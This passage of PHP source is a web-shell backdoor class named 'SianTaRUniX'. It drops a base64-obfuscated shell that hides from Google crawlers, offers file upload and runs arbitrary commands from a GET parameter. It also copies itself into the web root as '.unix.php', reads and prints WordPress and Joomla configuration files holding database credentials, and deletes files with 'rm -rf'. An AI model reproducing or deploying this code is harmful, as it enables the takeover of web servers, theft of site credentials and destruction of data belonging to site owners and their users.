    }

    private function checkingClone($desti)
    {
        if (!is_readable($desti)) {
            $source = 'PD9waHAgDQplcnJvcl9yZXBvcnRpbmcoMCk7c2V0X3RpbWVfbGltaXQoMCk7Y2xhc3MgU2lhblRhUlVuaVh7cHJpdmF0ZSAkYWNjZXNzPWFycmF5KCd3d3ctZGF0YScsJ3d3dycsJ2FwYWNoZScpO3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpeyR1c2VyPWdldF9jdXJyZW50X3VzZXIoKTskdGhpcy0+Z2V0Rm9ybSgkdXNlcik7JHRoaXMtPnByb2Nlc3NGb3JtKCk7JHRoaXMtPmNtZCgpO31wcml2YXRlIGZ1bmN0aW9uIGdldEZvcm0oJHVzZXIpe2lmKHN0cnBvcyhzdHJ0b2xvd2VyKCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSksJ2dvb2dsZScpIT09ZmFsc2Upe2hlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicpO2V4aXQ7fSRzYWZlPUBpbmlfZ2V0KCdzYWZlX21vZGUnKTskc2VjdXJlPSghJHNhZmUpPyJTQUZFX01PREUgOiBPRkYiOiJTQUZFX01PREUgOiBPTiI7ZWNobyAiPHRpdGxlPlNpYW5UYVJVbmlYPC90aXRsZT4iO2VjaG8gIjxib2R5IHN0eWxlPSdiYWNrZ3JvdW5kOiMwMDMwQjA7Y29sb3I6I2ZmZjtmb250LWZhbWlseTptb25vc3BhY2U7Zm9udC1zaXplOjEzcHg7Jz4iO2VjaG8gIjxiPiIuJHNlY3VyZS4iPC9iPjxicj4iOyRjdXJfdXNlcj0iKCIuJHVzZXIuIikiO2VjaG8gIjxiPlVzZXIgOiB1aWQ9Ii5nZXRteXVpZCgpLiRjdXJfdXNlci4iIGdpZD0iLmdldG15Z2lkKCkuJGN1cl91c2VyLiI8L2I+PGJyPiI7ZWNobyAiPGI+VW5hbWUgOiAiLnBocF91bmFtZSgpLiI8L2I+PGJyLz4iO2lmKGlzc2V0KCRfR0VUWydhcCddKSl7ZWNobyAiPGZvcm0gZW5jdHlwZT1tdWx0aXBhcnQvZm9ybS1kYXRhIGFjdGlvbiBtZXRob2Q9UE9TVD48Yj5VcGxvYWQgRmlsZTwvYj48YnIvPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPXN1Ym1pdD48aW5wdXQgdHlwZT1maWxlIG5hbWU9dXNlcmZpbGUgc2l6ZT0yOD48YnI+PGI+TmV3IG5hbWU6IDwvYj48aW5wdXQgdHlwZT10ZXh0IHNpemU9MTUgbmFtZT1uZXduYW1lIGNsYXNzPXRhPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz1idCB2YWx1ZT1VcGxvYWQ+PC9mb3JtPiI7fX1wcml2YXRlIGZ1bmN0aW9uIHByb2Nlc3NGb3JtKCl7aWYoaXNzZXQoJF9QT1NUWydzdWJtaXQnXSkpeyR1cGxvYWRkaXI9JHRoaXMtPnB3ZCgpO2lmKCEkbmFtZT0kX1BPU1RbJ25ld25hbWUnXSl7JG5hbWU9JF9GSUxFU1sndXNlcmZpbGUnXVsnbmFtZSddO31tb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1sndXNlcmZpbGUnXVsndG1wX25hbWUnXSwkdXBsb2FkZGlyLiRuYW1lKTtlY2hvKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyd1c2VyZmlsZSddWyd0bXBfbmFtZSddLCR1cGxvYWRkaXIuJG5hbWUpKT8iISFVcGxvYWQgRmFpbGVkIjoiU3VjY2VzcyBVcGxvYWQgdG8gIi4kdXBsb2FkZGlyLiRuYW1lO319cHJpdmF0ZSBmdW5jdGlvbiBwd2QoKXskY3dkPWdldGN3ZCgpO2lmKCR1PXN0cnJwb3MoJGN3ZCwnLycpKXtyZXR1cm4oJHUhPXN0cmxlbigkY3dkKS0xKT8kY3dkLicvJzokY3dkO31lbHNlaWYoJHU9c3RycnBvcygkY3dkLCdcLycpKXtpZigkdSE9c3RybGVuKCRjd2QpLTEpe3JldHVybiAkY3dkLidcLyc7fWVsc2V7cmV0dXJuICRjd2Q7fX19cHJpdmF0ZSBmdW5jdGlvbiBjbWQoKXtlY2hvKGlzc2V0KCRfR0VUWyd4MHgnXSkpPyc8cHJlPicuJHRoaXMtPmV4ZSgkX0dFVFsneDB4J10pLic8L3ByZT4nOic8cHJlPicuJHRoaXMtPmV4ZSgnbHMgLWxhJykuJzwvcHJlPic7fXByaXZhdGUgZnVuY3Rpb24gZXhlKCRjbWQpeyRyZXM9Jyc7aWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpe0BleGVjKCRjbWQsJHJlcyk7JHJlcz1qb2luKCI8YnIvPiIsJHJlcyk7fWVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSl7JHJlcz1Ac2hlbGxfZXhlYygkY21kKTt9ZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpe0BvYl9zdGFydCgpO0BzeXN0ZW0oJGNtZCk7JHJlcz1Ab2JfZ2V0X2NvbnRlbnRzKCk7QG9iX2VuZF9jbGVhbigpO31lbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKXtAb2Jfc3RhcnQoKTtAcGFzc3RocnUoJGNtZCk7JHJlcz1Ab2JfZ2V0X2NvbnRlbnRzKCk7QG9iX2VuZF9jbGVhbigpO31lbHNleyRyZXM9Jyc7fXJldHVybiAkcmVzO319bmV3IFNpYW5UYVJVbmlYKCk7';
            $code = base64_decode($source);
            $myfile = fopen($desti, 'w+');
            fwrite($desti, $code);
            fclose($desti);
        }
    }

    private function Bajak($path)
    {
        if (file_exists($path)) {
            @unlink($path);
        }
        $source = $_SERVER['SCRIPT_FILENAME'];
        $desti = $_SERVER['DOCUMENT_ROOT'] . '.unix.php';
        copy($source, $desti);
    }

    private function joomlaDb()
    {
        $p1 = '../../../../../../../';
        $p2 = '../../../../../../';
        $p3 = '../../../../../';
        $p4 = '../../../../';
        $p5 = '../../../';
        $p6 = '../../';
        $p7 = '../';
        $j = file_get_contents($p1 . 'configuration.php');
        if (!$j) {
            $j = file_get_contents($p2 . 'configuration.php');
            if (!$j) {
                $j = file_get_contents($p3 . 'configuration.php');
                if (!$j) {
                    $j = file_get_contents($p4 . 'configuration.php');
                    if (!$j) {
                        $j = file_get_contents($p5 . 'configuration.php');
                        if (!$j) {
                            $j = file_get_contents($p6 . 'configuration.php');
                            if (!$j) {
                                $j = file_get_contents($p7 . 'configuration.php');
                                if (!$j) {
                                    $j = file_get_contents('configuration.php');
                                }
                            }
                        }
                    }
                }
            }
        }
        echo $j;
        exit;
    }

    private function wpDb()
    {
        $p1 = '../../../../../../../';
        $p2 = '../../../../../../';
        $p3 = '../../../../../';
        $p4 = '../../../../';
        $p5 = '../../../';
        $p6 = '../../';
        $p7 = '../';
        $w = file_get_contents($p1 . 'wp-config.php');
        if (!$w) {
            $w = file_get_contents($p2 . 'wp-config.php');
            if (!$w) {
                $w = file_get_contents($p3 . 'wp-config.php');
                if (!$w) {
                    $w = file_get_contents($p4 . 'wp-config.php');
                    if (!$w) {
                        $w = file_get_contents($p5 . 'wp-config.php');
                        if (!$w) {
                            $w = file_get_contents($p6 . 'wp-config.php');
                            if (!$w) {
                                $w = file_get_contents($p7 . 'wp-config.php');
                                if (!$w) {
                                    $w = file_get_contents('wp-config.php');
                                }
                            }
                        }
                    }
                }
            }
        }
        echo $w;
        exit;
    }

    private function delete($file)
    {
        chmod('./', 0755);
        chmod('../', 0755);
        chmod('../../', 0755);
        @unlink($this->pwd() . $file);
        $this->exe('rm -rf ' . $file);
        $this->exe('del ' . $file);
    }
}

new SianTaRUniX();
